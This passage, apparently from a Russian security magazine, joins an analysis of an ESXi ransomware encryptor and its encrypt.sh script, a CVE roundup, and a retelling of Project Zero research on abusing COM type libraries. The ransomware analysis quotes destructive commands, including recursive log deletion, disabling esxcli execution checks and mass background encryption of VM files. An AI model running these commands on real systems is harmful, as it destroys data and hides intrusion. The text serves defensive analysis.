   использования, чтобы гарантировать отсутствие остаточных данных.
 • Модификация битов (в первом и последнем байтах массива). Это стан‐
   дартная процедура для корректной настройки закрытого ключа для алго‐
   ритма Curve25519.
 • Генерация общего секрета с использованием алгоритма Диффи — Хел‐
   лмана посредством Curve2579. Функция curve25519_donna задейство‐
   вана для выполнения операций Диффи — Хеллмана с использованием
   алгоритма Curve25519. Значения sharedSecret1 и sharedSecret2
   генерируются с помощью закрытого ключа curve25519PrivateArray
   и двух разных открытых ключей privateKey1 и privateKey2.
 • После вычислений закрытый ключ curve25519PrivateArray очищается
   с помощью функции secure_memset, чтобы предотвратить утечку чувс‐
   твительной информации.
 • Создается  хеш  SHA-256  от  sharedSecret2.   sha256_init()
   и sha256_hash() , подготавливается и вычисляется хеш.
 • secure_memset(); очищает память, использованную для вычисления
   SHA-256, чтобы удалить промежуточные данные.
 • sosemanuk_schedule()  готовит  внутренние  состояния  для  шифра
  Sosemanuk на основе ключа (результата SHA-256).
 • sosemanuk_init() завершает инициализацию шифра, передавая под‐
   готовленный контекст.
 • После использования  ключа из SHA-256 он  очищается с помощью
  secure_memset.

На следующем этапе выполняется инициализация списка разделов и провер‐
ка файловой системы.





Эта часть кода, как можно понять из названия функций, отвечает за создание
списка разделов init_partition, а также за добавление нового раздела,
если   таковых   нет   или   получено   неверное   значение   функции
check_file_system.





                    Развернутая функция check_file_system

Затем программа проверяет, является ли входная структура валидной MBR
или GPT.





                       Развернутая функция add_partition

Эта функция обеспечивает динамическое увеличение массива (если массив
заполнен, его емкость удваивается) и при необходимости управляет соз‐
данием новых разделов, предотвращая разрыв между последним разделом
и только что созданным.
   Затем вредоносная программа начинает шифровать каждую часть блока
или файлового раздела.





                      Шифрование разделов

Эта функция  итеративно обрабатывает массив разделов, вызывая одну
из двух функций шифрования:
 • encrypt_other_partition —  используется для разделов, которые
   не являются первым или которые имеют специфические типы;
 • encrypt_file_block — вызывается для первого раздела без данных
   или для разделов типа 9 (нестандартный или устаревший тип разделов).

Давай глубже изучим, как устроена каждая из этих функций.





                  Развернутая функция encrypt_other_partition

Функция обрабатывает раздел файловой системы блоками по 100 Мбайт,
после чего вызывает функцию шифрования блока и выполняет смещение
на такой же объем данных.





                    Развернутая функция encrypt_file_block

Функция encrypt_file_block обеспечивает шифрование части файла, обработ‐
ка которого происходит блоками фиксированного размера (до 10 Мбайт).
Сначала выделяется память временного буфера, который будет исполь‐
зоваться для чтения и обработки данных. Затем функция начинает цикл,
в котором данные из файла читаются в буфер, шифруются с помощью алго‐
ритма Sosemanuk, а затем записываются обратно в файл на то же место.
При вызове encrypt_file_block считывается размер файла, вычисляется
количество нужных проходов, а внутри цикла все стандартно. Понятно, что,
убедившись  в  работоспособности  своей  программы,  злоумышленники
добавили скрипт для очистки следов.


             INFO

                     Sosemanuk —  потоковый шифр,  построенный
                       на основе SNOW 2.0 и идей блок‑шифра Serpent.
                   Он  дает  высокую   пропускную   способность
                      при сравнительно небольшой нагрузке на CPU,
                         что очень выгодно для обработки больших фай‐
                          лов.


На завершающем этапе происходит очистка ресурсов и запись первичного
публичного ключа.





                     Развернутая функция write_public_key

Функция write_public_key проверяет, передан ли корректный путь к файлу.
Если путь не указан, выполнение программы завершается с ошибкой. Затем
функция шифрует данные, основываясь на предоставленном списке раз‐
делов и ключе шифрования, и сохраняет зашифрованный результат в файл
с временным расширением.
   После этого формируется новое имя для файла путем добавления того же
расширения к исходному пути. Длина нового имени проверяется, чтобы убе‐
диться, что она не превышает допустимого предела. Если это условие соб‐
людается,  временный файл  переименовывается  в  итоговый. В  случае
успешного выполнения всех операций функция возвращает положительный
результат. Если на каком‑либо этапе происходит ошибка, возвращается зна‐
чение, указывающее на неудачу.
   Таким  образом,  *.vmdk  оказывается  зашифрованным  «на  месте»,
при этом сама структура данных на низком уровне портится — виртуальные
машины не смогут прочитать нужные блоки и запуститься.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
 ВИРТУАЛЬНЫЙ ШИФР
           АНАЛИЗИРУЕМ ЭНКОДЕР ДЛЯ
                      VMWARE ESXI





СКРИПТ ENCRYPT.SH

Второй компонент — encrypt.sh — крайне важен, потому что этот скрипт
выполняет массу подготовительных и завершающих шагов. Прежде всего он
проверяет, не был ли уже запущен этот же скрипт раньше. Для этого исполь‐
зуется проверка такого вида:


ps -c | grep <script_name> | grep -v $$

Она позволяет не конфликтовать с собственным PID.
   Если скрипт уже загружен в память, то он завершает свою работу, если
нет, производится установка системных параметров:


esxcli system settings advanced set -o /User/execInstalledOnly -i 0

Дальше — изменение лимитов (ulimit -p, -n), что снимает ограничения
на число процессов и дескрипторов. Это нужно, чтобы параллельно запустить
как можно больше процессов шифрования.
   Далее идет поиск конфигов ESXi, где содержатся ссылки на .vmdk и .vswp,
и замена их ссылками на 1.vmdk, 1.vswp и так далее при помощи sed. Такое
действие ломает конфигурацию, чтобы администратор не смог легко запус‐
тить виртуальные машины и «в лоб» восстановить их работоспособность. Так‐
же скрипт отыскивает и убивает процессы VMX. С точки зрения злоумыш‐
ленника, это необходимо, чтобы освобожденные виртуальные диски гаран‐
тированно лежали на диске в консистентном виде, ведь если идет активная
запись, шифрование может столкнуться с конфликтами. Вдобавок остановка
виртуальной машины гарантирует, что жертве будет труднее быстро экспор‐
тировать виртуальные диски в intact-состоянии.





          Фрагмент файла encrypt.sh. Отключение процессов VMX

Когда подготовительная фаза завершается, bash-скрипт запускает собствен‐
но бинарь encrypt для всех найденных файлов:


find "/vmfs/volumes/" -type f -name *.vmdk, *.vmx, *.vmsn, *.vswp, *.
vmem, *.vmss, *.nvram

Для каждого файла он вызывает nohup /tmp/encrypt "filename" >/dev/
null 2>&1&, что означает: процесс запускается в фоне, перенаправив вывод,
и позволяет скрипту двигаться дальше, не дожидаясь окончания процесса
шифрования.
   Параллельно может  запуститься  множество  таких  encrypt-процессов,
которые максимально быстро зашифруют  несколько гигабайтов  данных.
В процессе скрипт копирует motd в файл How To Restore Your Files.txt,
который размещает рядом с каждым шифруемым файлом, — типичное
поведение  вымогателей,  оставляющих  инструкцию  для  жертвы.  Также
encrypt.sh может менять index.html, чтобы при обращении к интерфейсу
ESXi жертве показывалось сообщение с требованием выкупа.
   Последним шагом идет удаление логов (find / -name *.log -exec rm
-rf {} ;), правка cron (удаление строк либо подмена crontabs/root), что‐
бы скрыть следы проникновения и исключить быстрый rollback конфигурации
через встроенные механизмы.





             Фрагмент файла encrypt.sh. Замена файлов cron


ОБЩИЙ АНАЛИЗ АТАКИ

Чтобы провести более глубокий анализ, важно рассмотреть криптографичес‐
кие детали. Как уже упоминалось, криптографическая эллиптическая кривая
Curve25519 обычно используется для вычисления общего секрета по схеме
Диффи — Хеллмана, часто при умножении на приватный скаляр, пред‐
варительно  «маскированный» (сброс младших  битов,  установка  одного
из старших). У троянов‑энкодеров этот метод нередко служит для фор‐
мирования ephemerical-ключа, который потом может быть либо сохранен
на стороне преступников, либо упакован в специальный файл. Если у зло‐
умышленников есть «публичная часть», то они смогут расшифровать файлы
при помощи хранящегося у них «приватного» компонента.
  В комбинированных реализациях также присутствует SHA-256, который
хеширует промежуточный ключ, а затем передает его в sosemanuk_schedule
для  генерации  раундовых  подключей.  Авторы  троянов  очень  любят
Sosemanuk за высокую скорость, которая критически важна при шифровании
больших файлов, таких как *.vmdk, достигающих десятков гигабайтов. Воз‐
никает вопрос: как минимизировать риск такой атаки?
   Наиболее  важными мерами  можно  считать  следующие.  Во‑первых,
регулярно обновлять VMware Horizon и связанные с ней Java-компоненты, что
позволяет закрыть уязвимость Log4Shell. Во‑вторых,  категорически  зап‐
ретить использовать единый пароль локального администратора на многих
серверах: если бы злоумышленник не смог применить NTLM-хеш локального
админа, он не смог бы расширить свое присутствие в сети и дойти до ESXi.
В‑третьих, нужно избегать сценариев, где Domain Admin обладает SSH-дос‐
тупом к гипервизору.
   Лучшей практикой остается сегментация управления: ESXi отделяется
от доменных учетных записей, доступ к SSH разрешается только через уни‐
кальных локальных пользователей с ротацией паролей. Также требуется
регулярно контролировать целостность crontab и выполнять ротацию backup-
образа ESXi  (auto-backup.sh в ESXi обычно  сохраняет  конфигурацию,
но злоумышленник также может его повредить).
   Анализируя поведение bash-скрипта, можно заметить, что он предус‐
матривает и подмену index.html внутри /usr/lib/vmware. На практике
это делается злоумышленниками, чтобы при заходе на веб‑интерфейс ESXi
жертва видела не стандартные экраны, а сообщение наподобие «All your data
is encrypted. Pay X BTC or lose everything». В таких сценариях троян действи‐
тельно выводит из строя систему, ведь ESXi без конфигурации не может
запускать виртуалки, а файлы *.vmdk становятся бесполезны. Некоторые
версии скрипта также меняют /etc/motd и /etc/note на угрожающие пос‐
лания. Чтобы удостовериться, что все задуманное выполнено, злоумыш‐
ленники используют команду kill -9 для hostd и vmx, а потом подменяют
hostd-probe.sh, rhttpproxy/endpoints.conf и прочие файлы. Это очень
агрессивный  подход, в  результате  которого  наступает полный паралич
инфраструктуры.
  Еще  один  признак  продуманности  атаки —  использование  nohup
и фоновых процессов. Шифрование больших файлов может занять время,
поэтому вредонос запускает несколько процессов, каждый шифрует свою
цель, параллельно выполняя операции ввода‑вывода. При наличии хорошей
сети хранения данных (SAN) и высоких IOPS сам процесс может идти дос‐
таточно быстро. Администратор, заметивший аномальную нагрузку, может
попытаться остановить скрипт, но будет уже поздно: процессы шифроваль‐
щика все еще запущены. Кроме того, bash-скрипт периодически ждет завер‐
шения encrypt, подсчитывая /bin/ps | /bin/grep encrypt | /bin/wc -
l, чтобы потом выполнить завершающую очистку и восстановить некоторые
файлы (например, hostd-probe.bak).
   Авторы трояна также позаботились о том, чтобы удалить файлы журналов
с расширением *.log, которые могли бы пролить свет на происходившие
в системе события. На практике многие компании сводят логи ESXi в центра‐
лизованные источники, но, если этого не делать, расследование может стол‐
кнуться с трудностями.
  При попытках инцидент‑респонса нередко выясняется, что логи на уровне
/var/log/ просто пусты или уже вычищены. К тому же cron-таски, которые
могли бы выполнять резервное копирование, уничтожаются. Злоумышленни‐
ки после завершения операции восстанавливают /sbin/hostd-probe из .
bak, чтобы вернуть ESXi в рабочее состояние, но с зашифрованными VMDK.
   Таким образом, архитектура атаки со стороны выглядит следующим обра‐
зом: в сеть компании проникает хакер через уязвимый Horizon (Log4Shell),
получает права локального админа, затем с помощью pass-the-hash доходит
до ESXi, загружает туда два файла (encrypt и encrypt.sh), выставляет им
права chmod +x, выполняет скрипт, который отключает виртуалки, ломает
конфиг, запускает массовое шифрование. Затем — чистит логи, подменяет
веб‑интерфейс, вставляет сообщения для жертвы и уходит. Компания оста‐
ется без виртуальных машин и без журналов, зато с инструкцией по оплате
выкупа в каждой директории. Основываясь на известных образцах энкодеров,
можно сделать вывод, что подобная схема уже неоднократно встречалась,
а использование современных криптопримитивов Curve25519 + Sosemanuk
надежно блокирует возможность дешифровки файлов без ключа. Админис‐
траторам   и   службам   безопасности    остается   лишь    надеяться
на офлайн‑бэкапы, которые не были затронуты шифровальщиком.


КАК ПРЕДОТВРАТИТЬ?

С точки зрения предотвращения подобных атак важно не только «патчить
Horizon» или «не использовать одинаковые пароли», но и грамотно проекти‐
ровать всю инфраструктуру. Также стоит проводить антивирусный монито‐
ринг, хотя и не всегда это помогает при запуске ELF-файлов в особой среде
ESXi. Но по крайней мере анализ системных каталогов /tmp может выявить
внезапно появившиеся там исполняемые файлы. При регулярном экспорте
логов (syslog) на внешнее хранилище хотя бы удастся понять, когда была
выполнена команда kill -9, когда появились те или иные строки в cron.
Это существенно облегчает расследование инцидента.
   Если же атака уже произошла, а виртуальные диски зашифрованы, то
наилучшее решение — это откат из офлайн‑бэкапов. А при их отсутствии,
скорее всего, придется вести переговоры со злоумышленниками. Однако,
как показывает практика, такие переговоры не всегда завершаются рас‐
шифровкой файлов, ведь хакеры могут запросто исчезнуть, получив деньги.
Важно отметить, что некоторые группировки раньше применяли RC4, AES,
но теперь все чаще встречаются гибридные схемы (эллиптические кривые
и быстрая потоковая криптография). Это говорит о «повзрослевшем» уровне
ransomware-разработчиков,   которые   не   хотят   оставлять   шансов
на «самодельный» криптоанализ.
  В заключение хочу подчеркнуть, что этот энкодер, сопровождающийся
скриптом encrypt.sh, представляет собой изощренный инструмент: бинарь
обеспечивает надежное и быстрое шифрование, а bash-скрипт управляет
всем процессом от отключения виртуалок и ломки конфигов до уничтожения
логов и подмены веб‑интерфейса. Многочисленные команды внутри скрипта
показывают, что авторы прекрасно понимают среду ESXi, знают, какие про‐
цессы отвечают за работу VM, какие файлы критичны и в каком порядке их
надо править.
   Наиболее действенный набор защитных мер сводится к тому, чтобы ста‐
вить свежие патчи на VMware Horizon (закрывая Log4Shell), не допускать оди‐
наковых NTLM-хешей локального администратора, жестко сегментировать
ESXi, отключать неиспользуемые сервисы, регулярно выносить логи в центра‐
лизованную  SIEM  или  на  Syslog-сервер,  а   также  делать  полные
офлайн‑бэкапы, которые должны  храниться вне досягаемости злоумыш‐
ленников. При появлении в /tmp или в другом каталоге незнакомого ELF-
файла и скрипта нужно провести срочную проверку, ведь в случае срабаты‐
вания encrypt.sh последствия могут быть катастрофическими.
   Желательно  на  всякий  случай  следить  за  кронтасками,  проверяя,
не появились ли там посторонние строки. Важно включить многофакторную
аутентификацию (MFA), особенно для систем, использующих Horizon, чтобы
повысить уровень защиты от несанкционированного доступа. Также рекомен‐
дуется регулярно проверять настройки системы на соответствие Hardening
Guide от VMware. Это позволит отслеживать и корректировать конфигурацию
в соответствии с рекомендациями по безопасности.
  Все  компоненты  ESXi  должны быть подписаны цифровой подписью
VMware, а изменение уровня приемлемости (Acceptance Level) для непод‐
писанных модулей не рекомендуется и запрещено в сертифицированных
средах, таких как PCI DSS. Если необходимо обеспечить максимальную
безопасность, можно активировать Lockdown Mode и настроить пустое зна‐
чение DCUI.Access. Это полностью отключает доступ через SSH, CLI и DCUI,
в дополнение к стандартным Secure Boot и Host Profiles. Однако этот подход
усложняет диагностику и восстановление системы в случае сбоев, поэтому он
применяется только в средах с очень высокими требованиями по безопас‐
ности. Кроме того, доступ через SSH и CLI следует минимизировать, исполь‐
зуя их только в случае крайней необходимости и отключая после завершения
работы.
   Остается лишь надеяться, что сегодняшний разбор этой вредоносной
программы поможет администраторам и специалистам по информационной
безопасности вовремя распознать угрозу, принять меры и организовать гра‐
мотную защиту своей виртуальной инфраструктуры.
ВЗЛОМ





Этот месяц принес нам критическую уязвимость Node.js,
ставящую под удар множество программ на этом языке,
а  также  большой  урожай  багов  в  продуктах  Microsoft,
получивших патчи во «вторник обновлений».


NODE.JS

 • CVE: CVE-2023-32002
 • Уровень опасности: 9,8, критический
 • Тип уязвимости: удаленное выполнение кода (RCE)
 • Уязвимые продукты: Node.js 16.0.0–16.20.1, 18.0.0–18.17.0 и 20.0.0–
   20.5.0

CVE-2023-32002 — это уязвимость удаленного выполнения кода (RCE),
которая кроется в святая святых Node.js — функции Module._load(). Этот
метод отвечает за загрузку модулей, а значит, прямо влияет на работу тысяч
приложений на JavaScript. Дыру обнаружили и раскрыли через платформу
HackerOne. Потенциально этот баг может превратиться в серьезную голов‐
ную боль для всех, кто работает с Node.js.
  В политике безопасности Module._load() обнаружились косяки, из‑за
которых коварные злоумышленники (и не менее коварные исследователи)
получили шанс вмешаться в процесс и подсовывать свои вредоносные
модули. Из‑за бага можно обойти ограничения policy.json и загружать
любые модули, даже если они запрещены. А это потенциально — утечка дан‐
ных, подмена информации или даже отказ в обслуживании.
   Важно помнить, что Node.js — это не просто серверный движок, а фун‐
дамент для современных веб‑приложений, серверов и даже десктопных при‐
ложений на Electron. Все эти категории продуктов потенциально могут пос‐
традать от уязвимости.
  Для защиты обнови Node.js до актуальной версии: 16.20.1+, 18.17.0+
или 20.5.0+.


WINDOWS LDAP

 • CVE: CVE-2025-21376
 • Уровень опасности: 8,1, высокий
 • Тип уязвимости: удаленное выполнение кода (RCE)
 • Уязвимые продукты: Windows Server 2019, Windows 10 (1809 и более
   поздние)

Разработчики Microsoft выкатили февральский патч безопасности, в котором
залатали 63 дыры в разных продуктах. Четыре бага получили статус критичес‐
ких.
   Особенно  выделяется  CVE-2025-21376 —  лютая  RCE-уязвимость
в Windows LDAP. Здесь все плохо: из‑за гонки потоков в обработке LDAP воз‐
никает out-of-bounds write (OOBW), что открывает дорогу для выполнения
произвольного кода в lsass.exe. Правда, атакующему сначала нужно выиграть
гонку потоков.
   Эта уязвимость позволяет удаленному атакующему без аутентификации
выполнить свой код на уязвимой системе, просто закинув хитро составлен‐
ный запрос своей жертве. Пользователь тут вообще не нужен, а значит, баг
потенциально   может    распространяться    между   LDAP-серверами
без какого‑либо вмешательства. В Microsoft прямо говорят: «эксплуатация
вероятна», так что, даже если кажется, что пока все тихо, расслабляться
не стоит. Накатывай патч, пока твой сервер не погрузился в пучину хаоса!


WINDOWS DHCP CLIENT SERVICE

 • CVE: CVE-2025-21379
 • Уровень опасности: 7,1, высокий
 • Тип уязвимости: RCE
 • Уязвимые продукты: Windows 11 до 10.0.26100.3194, Windows Server
   2025 до 10.0.26

CVE-2025-21379 — еще один серьезный RCE-баг, на этот раз во встроенном
в Windows клиенте DHCP. Для успешного взлома атакующему нужно вклинить‐
ся в сетевое взаимодействие между жертвой и запрашиваемым ресурсом, то
есть устроить что‑то вроде MITM-атаки.
   Уязвимость  относится  к типу  use-after-free: код повторно использует
память или ссылается на нее после высвобождения. В какой‑то момент эта
память может снова выделиться и записаться в другой указатель, а старый
указатель все еще будет указывать куда‑то внутри нового выделения. Любые
операции с этим «призрачным» указателем становятся опасными, потому что
теперь эта область памяти уже в распоряжении другого кода.
   Чтобы защититься, обновляйся и ставь патчи. Они, кстати, закрывают
еще множество найденных багов — в том числе в Excel, Edge и многих под‐
системах Windows. Подробности о многих из них мы еще наверняка узнаем.


NVIDIA CUDA

 • CVE: CVE-2024-53870
 • Уровень опасности: 3,3, низкий
 • Тип уязвимости: выход за границы буфера
 • Уязвимые продукты: CUDA Toolkit до версии 12.8 включительно

CUDA появилась в 2006 году как платформа для параллельных вычислений
и программирования. В  состав CUDA  Toolkit  входят  утилиты cuobjdump
и nvdisasm — средства для анализа бинарников CUDA, которые запускаются
на  графических  процессорах  Nvidia. Эти  инструменты сами  по  себе
не исполняют код CUDA, но нужны для отладки и оптимизации программ.
   Бинарник CUDA — это исполняемый файл, в котором хранится код CUDA,
в том числе инструкции для графических процессоров Nvidia. Такие файлы
имеют расширение .cubin.
   Формат cubin основан на стандартном ELF, который используется в Linux
и Unix. Внутри содержится не только сам исполняемый код, но и служебные
данные: таблицы символов, информация о релокации и отладочные секции —
все, что нужно для запуска CUDA-кода на GPU Nvidia.
  В ходе аудита безопасности специалисты Palo Alto Networks провели мас‐
штабное фаззинг‑тестирование утилит cuobjdump и nvdisasm. В течение
месяца они гоняли файловый фаззер на обеих программах, и результаты ока‐
зались любопытными: шесть уязвимостей в cuobjdump и три в nvdisasm.
  Все найденные уязвимости удалось не только обнаружить, но и успешно
спровоцировать.
   Баги можно поделить на два типа:
 • переполнение целочисленного значения — когда код обрабатывает чис‐
   ло, слишком большое для выделенной под него области памяти;
 • выход за границы буфера — когда программа читает данные за предела‐
  ми выделенной памяти, что может привести к утечке данных или краху при‐
   ложения.

К примеру, баг, получивший CVE-2024-53870, — это уязвимость в бинарнике
cuobjdump: если передать ему поврежденный ELF-файл, можно спровоци‐
ровать чтение за границами буфера. Это может привести к частичному отказу
в обслуживании — утилита просто упадет. Некоторые из найденных уяз‐
вимостей могут позволить злоумышленнику получить несанкционированный
доступ к информации.
   Атака на подобные утилиты — это, пожалуй, крайне экзотический вектор,
и его эксплуатация требует множества условий, однако этот пример показы‐
вает, что уязвимость может быть где угодно, в том числе в инструментах,
от которых не ждешь подвоха.
ВЗЛОМ





COM-объекты в Windows могут застревать в неожиданных
местах — и это не баг, а фича, которой можно восполь‐
зоваться. Через интерфейс IDispatch и библиотеки типов
можно не просто управлять удаленными объектами, а внед‐
рять код в защищенные процессы (PPL), обходя механизмы
безопасности Microsoft. Последнее исследование Project
Zero рассказывает, как это сделать.


От редакции
Мы решили в качестве эксперимента начать знакомить читателей с лучшими
мировыми исследованиями. Далее — близкий к тексту пересказ поста Джей‐
мса Форшоу из блога Google Project Zero. Эта публикация доступна без плат‐
ной подписки.



Объектно ориентированные технологии удаленного взаимодействия, такие
как DCOM и .NET Remoting, позволяют без особых заморочек организовать
доступ к сервисам, пересекающим границы процессов и уровни безопас‐
ности. Фишка в том, что они поддерживают не только встроенные объекты,
но и любые другие, которые можно передавать удаленно.
   Например, захотелось тебе пробросить XML-документ через клиент‑сер‐
верный барьер? Не проблема — берешь готовую COM- или .NET-библиотеку,
заворачиваешь объект и отправляешь клиенту. По умолчанию объект мар‐
шализуется по ссылке. Это значит, что сам он остается на сервере, а клиент
лишь управляет им дистанционно.
  Но за такую гибкость приходится платить, и именно об этом пойдет речь —
о классе багов, который я назову «ловушка для объектов». Дело в том, что
не все объекты, которые можно передавать удаленно, безопасно так переда‐
вать. Например, те же XML-библиотеки в COM и .NET поддерживают выпол‐
нение произвольного кода в контексте XSLT-документа. А теперь представь:
если XML-объект доступен за пределами процесса, клиент может запустить
код прямо внутри серверного окружения. Итог — повышение привилегий
или даже удаленное выполнение кода. Красиво? Да. Опасно? Еще как!
   Сценариев, которые могут привести к этой уязвимости, хватает. Самый
частый —  когда  небезопасный  объект  случайно  становится доступным
для удаленного использования. Классический пример — CVE-2019-0555.
   Этот  баг  появился,  когда  разработчики Windows  Runtime  захотели
работать с XML-документами. Они не стали изобретать велосипед, а просто
прикрутили нужные интерфейсы к уже существующему COM-объекту XML
DOM Document v6. Казалось бы, все четко: новые интерфейсы не поддержи‐
вали выполнение XSLT-скриптов, значит, передавать объект через границы
привилегий безопасно. Но не тут‑то было! Злой хакер мог спокойно зап‐
росить старый интерфейс IXMLDOMDocument, который все еще оставался
доступным, и с его помощью выполнить XSLT-скрипт, вырвавшись из песоч‐
ницы. Итог — дырка в безопасности и повышение привилегий.
  Еще один сценарий — использование асинхронного маршалинга. Это ког‐
да объект может передаваться как по значению, так и по ссылке, но плат‐
форма по умолчанию выбирает передачу по ссылке.
   Например, в .NET классы FileInfo и DirectoryInfo сериализуемые, значит, их
можно передавать в .NET Remoting по значению. Но есть нюанс: они также
наследуются от MarshalByRefObject, что позволяет передавать их и по ссылке.
Тут‑то атакующий и может сыграть на особенностях маршалинга. Он отправ‐
ляет на сервер сериализованный объект, который при десериализации соз‐
дает новый экземпляр внутри серверного процесса.
   Дальше — хитрый ход: если атакующий может обратно получить этот объ‐
ект, рантайм автоматически отправит его по ссылке, оставляя его «запертым»
в серверном окружении. Итог? Злоумышленник сможет спокойно вызывать
методы этого объекта, например создавать файлы, причем с привилегиями
сервера. И вот тебе элегантное повышение прав.


        WWW

                       Этот трюк я реализовал в своем  инструменте
                         ExploitRemotingService.


Последний (и, пожалуй, самый интересный) сценарий — это злоупотребле‐
ние встроенными механизмами поиска и создания объектов в системе уда‐
ленного взаимодействия. Здесь мы заставляем сервер порождать неожидан‐
ные объекты, которые можно использовать в своих интересах.
   Например, в COM достаточно найти способ вызвать CoCreateInstance
с произвольным CLSID, получить объект в ответ — и вот у нас уже выполняет‐
ся произвольный код на сервере. Классический пример — CVE-2017-0211.
Эта  бага  позволяла  передавать  через  границу  безопасности  объект
Structured Storage, который поддерживал интерфейс IPropertyBag. А вот этот
интерфейс уже можно было использовать для создания любого COM-объ‐
екта в контексте сервера.
   Что можно было провернуть? Все тот же XML DOM Document! Создаем его
на  сервере,  получаем  обратно  по  ссылке  и...  включаем  XSLT-магию
для выполнения  произвольного  кода. Вуаля — повышение  привилегий
на ровном месте.


А ЧТО НАСЧЕТ IDISPATCH?

IDispatch — это часть OLE Automation, одной из первых фич COM, созданной
для удобной автоматизации. С его помощью клиент может динамически
вызывать методы объекта без строгой типизации — удобно для скриптовых
языков типа VBA и JScript.
   Фишка в том, что IDispatch прекрасно работает даже через границы про‐
цессов и уровней привилегий. Хотя чаще его используют внутри одного про‐
цесса, например в компонентах ActiveX. Но если такой объект вдруг окажется
доступен в удаленном взаимодействии, можно ожидать веселых последс‐
твий...
   Чтобы клиент мог динамически вызывать методы объекта COM, сервер
должен как‑то сообщить ему, какие параметры передавать и как их упаковы‐
вать. Для этого используется type library — файл с описанием типов, который
хранится на диске. Клиент может запросить эту информацию через метод
GetTypeInfo интерфейса IDispatch.
   Теперь начинается самое интересное. В COM интерфейс для работы
с библиотекой типов маршализуется по ссылке. То есть, когда клиент получа‐
ет ITypeInfo, он на самом деле управляет объектом, который остается на сер‐
вере. А это значит, что все вызовы методов на этом интерфейсе выполняются
в контексте сервера.
   Если этот механизм использовать хитро, можно заставить сервер делать
вещи, о которых его разработчики и не подозревали.
   Интерфейс ITypeInfo открывает две заманчивые дверцы для атакующего:
методы Invoke и CreateInstance.
  С Invoke облом — он не поддерживает удаленный вызов, потому что тре‐
бует загрузки type library в текущий процесс. А вот CreateInstance — совсем
другая история. Он вполне ремотабельный и вызывает CoCreateInstance
для создания COM-объекта по CLSID.
  И тут самое вкусное: создаваемый объект будет жить в серверном про‐
цессе, а не у клиента. То есть, если атакующий провернет этот трюк, он смо‐
жет заспаунить на сервере любой COM-объект, который ему нужен. Даль‐
ше — дело техники.
  Но стоп, если заглянуть в документацию CreateInstance, там нигде не вид‐
но параметра CLSID. Так как же тогда type library понимает, какой объект соз‐
дать?
   Фишка в том, что ITypeInfo описывает любой тип, который есть в type
library. Когда клиент вызывает GetTypeInfo, он получает только информацию
об интерфейсе, который хочет использовать. Если потом попробовать дер‐
нуть CreateInstance, ничего не выйдет — просто ошибка.
  Но тут на сцену выходит CoClass. В type library можно хранить не только
интерфейсы, но и CoClass-объекты, а вот они уже содержат CLSID нужного
COM-объекта. И если CreateInstance вызывается на CoClass, все срабаты‐
вает: создается объект с заданным CLSID прямо внутри серверного процес‐
са.
   Как же нам превратить объект с информацией об интерфейсе в объект,
представляющий   класс?  Все   просто:   у  ITypeInfo   есть  метод
GetContainingTypeLib,  который  возвращает  ссылку  на  ITypeLib —
интерфейс библиотеки типов. А уже через него можно перебрать все классы,
определенные в type library.
  И вот тут начинается веселье: среди этих классов может оказаться что‑то
совершенно небезопасное при удаленном использовании. Если такой объект
можно создать удаленно, это открывает дорогу к повышению привилегий
или даже запуску кода на сервере.
   Давай разберем это на практике! Сначала с помощью моего PowerShell-
модуля OleView.NET найдем подходящие COM-сервисы, которые поддержи‐
вают IDispatch. Если среди них окажется что‑то уязвимое... Ну, ты знаешь,
что делать!



  PS> $cls = Get-ComClass -Service
  PS> $cls | % { Get-ComInterface -Class $_ | Out-Null }
  PS> $cls | ? { $true -in $_.Interfaces.InterfaceEntry.IsDispatch } |
          Select Name, Clsid
  Name                                       Clsid
  ----                                       -----
  WaaSRemediation                            72566e27-1abb-4eb3-b4f0-
  eb431cb1cb32
  Search Gathering Manager                   9e175b68-f52a-11d8-b9a5-
  505054503030
  Search Gatherer Notification               9e175b6d-f52a-11d8-b9a5-
  505054503030
  AutomaticUpdates                           bfe18e9c-6d87-4450-b37c-
  e02f0b373803
  Microsoft.SyncShare.SyncShareFactory Class da1c0281-456b-4f14-a46d-
  8ed2e21a866f


Флаг -Service в Get-ComClass позволяет вытащить COM-классы, которые
работают в локальных сервисах. Дальше мы запрашиваем у каждого класса
список поддерживаемых интерфейсов. Вывод этой команды нам не нужен —
вся инфа уже сохраняется в свойстве Interfaces.
   Теперь самое интересное: отфильтруем только те классы, которые под‐
держивают IDispatch. В итоге у нас остается пять кандидатов.
   Возьмем первого — WaaSRemediation — и заглянем в его type library. Кто
знает, может, там затаилось что‑то интересное...



  PS> $obj = New-ComObject -Clsid 72566e27-1abb-4eb3-b4f0-eb431cb1cb32
  PS> $lib = Import-ComTypeLib -Object $obj
  PS> Get-ComObjRef $lib.Instance | Select ProcessId, ProcessName
  ProcessId ProcessName
  --------- -----------
      27020 svchost.exe
  PS> $parsed = $lib.Parse()
  PS> $parsed
  Name               Version TypeLibId
  ----               -------- ---------
  WaaSRemediationLib 1.0      3ff1aab8-f3d8-11d4-825d-00104b3646c0
  PS> $parsed.Classes | Select Name, Uuid
  Name                          Uuid
  ----                          ----
  WaaSRemediationAgent          72566e27-1abb-4eb3-b4f0-eb431cb1cb32
  WaaSProtectedSettingsProvider 9ea82395-e31b-41ca-8df7-ec1cee7194df


Скрипт  сначала  создает  COM-объект,  а  затем  с помощью  Import-
ComTypeLib получает интерфейс библиотеки типов.
   Чтобы убедиться, что объект реально работает вне процесса, мы мар‐
шализуем его через Get-ComObjRef и достаем инфу о процессе. Ожидаемо
объект живет внутри svchost.exe — общего исполняемого файла для сер‐
висов Windows.
   Разбираться с type library вручную — то еще удовольствие, поэтому упро‐
щаем себе жизнь: используем Parse, чтобы превратить ее в удобную объ‐
ектную модель. Теперь можно спокойно вывалить список классов и пос‐
мотреть, есть ли среди них что‑нибудь интересное (и опасное).
   Облом! В случае с этим COM-объектом все классы в type library уже
зарегистрированы для работы в сервисе, так что ничего нового мы не получи‐
ли.
  Но не беда — нам нужен другой вариант: класс, который зарегистрирован
только для работы в локальном процессе, но при этом описан в type library
удаленного сервиса.
   Такое бывает, потому что type library может использоваться одновременно
и для локальных (in-process) компонентов, и для сервисов, работающих вне
процесса. Если мы найдем такой класс, то сможем заставить удаленный сер‐
вис создать его у себя — и тут уже возможны очень интересные сценарии.
   Четыре оставшихся COM-класса тоже не дали ничего полезного (один
вообще оказался криво зарегистрирован и даже не экспортируется сер‐
висом). На этом можно было бы сдаться... Но нет!
   Дело в том, что type library может ссылаться на другие библиотеки типов,
а их тоже можно просканировать с помощью тех же интерфейсов. Так что
скрытые классы все‑таки есть — просто они не лежат на поверхности.
   Давай копнем глубже и посмотрим, что откопается.



